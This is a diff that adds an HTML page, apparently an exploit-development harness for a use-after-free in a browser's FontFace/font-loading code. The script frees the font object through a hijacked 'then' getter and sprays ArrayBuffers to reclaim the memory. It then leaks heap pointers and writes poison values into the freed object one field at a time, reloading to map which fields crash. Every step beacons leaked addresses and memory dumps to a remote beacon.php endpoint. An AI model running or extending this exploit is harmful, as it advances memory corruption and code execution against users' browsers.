@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>P810</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+</style>
+</head><body>
+<pre id="o">P810 crash-field mapper</pre>
+<script>
+'use strict';
+var B='';
+function bn(t,d){try{var x=new XMLHttpRequest();x.open('GET',B+'/beacon.php?tag=P810-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,700))+'&t='+Date.now(),false);x.send();}catch(e){}}
+var O=document.getElementById('o');
+function log(s){O.textContent+='\n'+s;}
+function readU64(bv,off){var lo=bv.getUint32(off,true),hi=bv.getUint32(off+4,true);return{hi:hi,lo:lo};}
+function writeU64(bv,off,hi,lo){bv.setUint32(off,lo,true);bv.setUint32(off+4,hi,true);}
+function addrStr(a){return'0x'+a.hi.toString(16)+('00000000'+a.lo.toString(16)).slice(-8);}
+function h16(v){return('0000000000000000'+BigInt(v||0).toString(16)).slice(-16);}
+function dumpAB(ab){var v=new BigUint64Array(ab),p=[];for(var q=0;q<24;q++)if(v[q]!==BigInt(0))p.push('q'+q+'=0x'+h16(v[q]));return p.join('|');}
+
+// Poison value: kernel space, guaranteed SIGSEGV if dereferenced
+var POISON_HI = 0xDEAD;
+var POISON_LO = 0xDEADBEEF;
+
+// Track which field we're testing via localStorage (survives reload)
+var KEY = 'p810_field';
+var startField = 0;
+try { startField = parseInt(localStorage.getItem(KEY)) || 0; } catch(e){}
+
+bn('BOOT', 'v1|startField=' + startField);
+
+if (startField >= 24) {
+  // All 24 fields tested without crash!
+  bn('ALL-SAFE', 'no_field_crashes_layout');
+  log('ALL 24 qwords safe — engine does NOT dereference any field during layout');
+
+  // Reset and try DIFFERENT triggers
+  try { localStorage.setItem(KEY, '0'); } catch(e){}
+
+  // Phase B: Try property setters as triggers instead of layout
+  phaseB();
+} else {
+  // Phase A: UAF + crash-map one field at a time
+  phaseA();
+}
+
+function phaseA(){
+  var st=document.createElement('style');
+  st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(st);
+  var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+  document.fonts.add(face);
+  void face.loaded;
+
+  var abs=[],fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      if(st){st.remove();st.textContent='';st=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      abs=[];
+      for(var i=0;i<64;i++)abs.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em bb1');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f1, bb1','AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var bestI=-1,bestNz=0;
+    for(var i=0;i<abs.length;i++){
+      var u=new Uint8Array(abs[i]),nz=0;
+      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+      if(nz>bestNz){bestNz=nz;bestI=i;}
+    }
+    if(bestI<0||bestNz<4){
+      bn('A-MISS','nz='+bestNz);
+      setTimeout(function(){location.reload();},300);
+      return;
+    }
+    var ab=abs[bestI];
+    var dv=new DataView(ab);
+    var q11=readU64(dv,0x58);
+    if(q11.hi===0){bn('A-MISS','q11h=0');setTimeout(function(){location.reload();},300);return;}
+    var borrow=(q11.lo<0x68)?1:0;
+    var self_addr={hi:q11.hi-borrow,lo:(q11.lo-0x68)>>>0};
+    var q13=readU64(dv,0x68);
+
+    bn('A-HIT','self='+addrStr(self_addr)+'|q13='+addrStr(q13)+'|field='+startField);
+    log('HIT! Testing field q'+startField+' with poison...');
+
+    // Save original value
+    var origHi=dv.getUint32(startField*8+4,true);
+    var origLo=dv.getUint32(startField*8,true);
+    bn('A-ORIG','q'+startField+'=0x'+origHi.toString(16)+origLo.toString(16));
+
+    // Write poison to the field under test
+    writeU64(dv, startField*8, POISON_HI, POISON_LO);
+
+    // Record that we're testing this field (so if we crash, next load tries the next one)
+    try { localStorage.setItem(KEY, String(startField + 1)); } catch(e){}
+
+    // Send pre-trigger beacon
+    bn('A-POISON','q'+startField+'=DEAD_DEADBEEF|triggering_layout...');
+
+    // === TRIGGER 1: Layout ===
+    var el=document.createElement('div');
+    el.style.fontFamily='f1, serif';
+    el.style.fontSize='24px';
+    el.textContent='CRASH TEST q'+startField;
+    document.body.appendChild(el);
+    document.body.offsetHeight;
+
+    // If we get here, layout didn't crash
+    setTimeout(function(){
+      bn('A-SAFE-LAYOUT','q'+startField+'_survived_layout');
+
+      // === TRIGGER 2: fonts.check ===
+      try{document.fonts.add(face);}catch(e){}
+      try{
+        var chk=document.fonts.check('1em f1');
+        bn('A-SAFE-CHECK','q'+startField+'_survived_check='+chk);
+      }catch(e){bn('A-CHECK-ERR','q'+startField+'_err='+e.message);}
+
+      // === TRIGGER 3: fonts.load ===
+      try{
+        document.fonts.load('1em f1','X').then(function(){
+          bn('A-SAFE-LOAD','q'+startField+'_survived_load');
+        }).catch(function(e){
+          bn('A-LOAD-ERR','q'+startField+'_err='+e.message);
+        });
+      }catch(e){bn('A-LOAD-ERR2',e.message);}
+
+      // === TRIGGER 4: face.load() ===
+      try{
+        face.load().then(function(){
+          bn('A-SAFE-FACELOAD','q'+startField+'_survived_faceload');
+        }).catch(function(e){
+          bn('A-FACELOAD-ERR','q'+startField+'_err='+e.message);
+        });
+      }catch(e){bn('A-FACELOAD-ERR2',e.message);}
+
+      // === TRIGGER 5: Property setters ===
+      try{face.family='poisoned'+startField;bn('A-SAFE-SETFAM','q'+startField+'_ok');}catch(e){bn('A-SETFAM-ERR',e.message);}
+      try{face.weight='bold';bn('A-SAFE-SETWT','q'+startField+'_ok');}catch(e){bn('A-SETWT-ERR',e.message);}
+      try{face.style='italic';bn('A-SAFE-SETST','q'+startField+'_ok');}catch(e){bn('A-SETST-ERR',e.message);}
+
+      // Check if AB changed after triggers
+      var postDump=dumpAB(ab);
+      bn('A-POST','q'+startField+'|'+postDump);
+
+      // Restore original and advance to next field
+      writeU64(dv, startField*8, origHi, origLo);
+
+      // Move to next field and reload
+      // (already set localStorage above, just reload)
+      setTimeout(function(){
+        bn('A-NEXT','moving_to_q'+(startField+1));
+        location.reload();
+      },500);
+    },300);
+  },400);
+}
+
+function phaseB(){
+  bn('B0','alt_triggers');
+  log('Phase B: testing alternative crash triggers...');
+
+  // Do a fresh UAF for Phase B experiments
+  var st2=document.createElement('style');
+  st2.textContent="@font-face{font-family:bb2;src:local(Arial);unicode-range:U+0044;}";
+  document.head.appendChild(st2);
+  var face2=new FontFace('f2',"local('Helvetica')",{unicodeRange:'U+0043'});
+  document.fonts.add(face2);
+  void face2.loaded;
+
+  var abs2=[],fired2=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired2)return undefined;
+      fired2=true;
+      if(st2){st2.remove();st2.textContent='';st2=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      abs2=[];
+      for(var i=0;i<64;i++)abs2.push(new ArrayBuffer(192));
+      try{document.fonts.check('1em bb2');}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em f2, bb2','CD');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+    var bestI=-1,bestNz=0;
+    for(var i=0;i<abs2.length;i++){
+      var u=new Uint8Array(abs2[i]),nz=0;
+      for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+      if(nz>bestNz){bestNz=nz;bestI=i;}
+    }
+    if(bestI<0||bestNz<4){
+      bn('B-MISS','nz='+bestNz);
+      setTimeout(function(){location.reload();},300);
+      return;
+    }
+    var ab=abs2[bestI];
+    var dv=new DataView(ab);
+    bn('B-HIT','i='+bestI+'|dump='+dumpAB(ab));
+
+    // B1: Poison ALL fields at once and try various APIs
+    // Save all originals first
+    var originals=[];
+    for(var q=0;q<24;q++){
+      originals.push({hi:dv.getUint32(q*8+4,true),lo:dv.getUint32(q*8,true)});
+    }
+
+    // Poison everything except q11/q13 (needed for self_addr)
+    for(var q=0;q<24;q++){
+      if(q===11||q===13)continue; // keep self/source ptrs
+      writeU64(dv,q*8,POISON_HI,POISON_LO);
+    }
+    bn('B1-POISONED','all_except_q11_q13');
+
+    // Try GC
+    try{
+      // Force GC by allocating and releasing
+      for(var i=0;i<100;i++){var tmp=new ArrayBuffer(1024*1024);}
+      bn('B1-GC','gc_pressure_ok');
+    }catch(e){bn('B1-GC-ERR',e.message);}
+
+    // Try canvas with the font
+    try{
+      var c=document.createElement('canvas');
+      c.width=200;c.height=50;
+      var ctx=c.getContext('2d');
+      ctx.font='48px f2, serif';
+      var m=ctx.measureText('ABCDEF');
+      bn('B1-CANVAS','w='+m.width);
+    }catch(e){bn('B1-CANVAS-ERR',e.message);}
+
+    // Try creating InputEvent
+    try{
+      var inp=document.createElement('input');
+      inp.style.fontFamily='f2';
+      document.body.appendChild(inp);
+      inp.value='test';
+      document.body.offsetHeight;
+      bn('B1-INPUT','ok');
+    }catch(e){bn('B1-INPUT-ERR',e.message);}
+
+    // Check if anything changed in AB
+    var changed=false;
+    for(var q=0;q<24;q++){
+      if(q===11||q===13)continue;
+      var cur={hi:dv.getUint32(q*8+4,true),lo:dv.getUint32(q*8,true)};
+      if(cur.hi!==POISON_HI||cur.lo!==POISON_LO){
+        bn('B1-CHANGE','q'+q+'=0x'+cur.hi.toString(16)+cur.lo.toString(16));
+        changed=true;
+      }
+    }
+    if(!changed)bn('B1-STABLE','no_changes_to_poisoned_fields');
+
+    // Restore
+    for(var q=0;q<24;q++){
+      writeU64(dv,q*8,originals[q].hi,originals[q].lo);
+    }
+
+    // B2: Try structuredClone of the face
+    try{
+      var cloned=structuredClone(face2);
+      bn('B2-CLONE','cloned='+typeof cloned+'|status='+cloned.status);
+    }catch(e){bn('B2-CLONE','err='+e.message);}
+
+    // B3: Try to extract face's internal ID via toString/valueOf
+    try{bn('B3-STR','toString='+face2.toString());}catch(e){bn('B3-STR','err='+e.message);}
+    try{bn('B3-VAL','valueOf='+face2.valueOf());}catch(e){bn('B3-VAL','err='+e.message);}
+    try{bn('B3-JSON','json='+JSON.stringify(face2));}catch(e){bn('B3-JSON','err='+e.message);}
+
+    // B4: Try Symbol.toPrimitive
+    try{
+      var prim=face2[Symbol.toPrimitive]||'none';
+      bn('B4','toPrimitive='+prim);
+    }catch(e){bn('B4','err='+e.message);}
+
+    // B5: Check if WeakRef to face gives address info
+    try{
+      var wr=new WeakRef(face2);
+      bn('B5','weakref='+typeof wr+'|deref='+typeof wr.deref());
+    }catch(e){bn('B5','err='+e.message);}
+
+    // B6: Check FinalizationRegistry
+    try{
+      var fr=new FinalizationRegistry(function(val){
+        bn('B6-FINAL','finalized='+val);
+      });
+      fr.register(face2,'face2');
+      bn('B6','registered');
+    }catch(e){bn('B6','err='+e.message);}
+
+    bn('DONE','all_complete');
+    log('DONE');
+    try{localStorage.removeItem(KEY);}catch(e){}
+  },400);
+}
+</script></body></html>
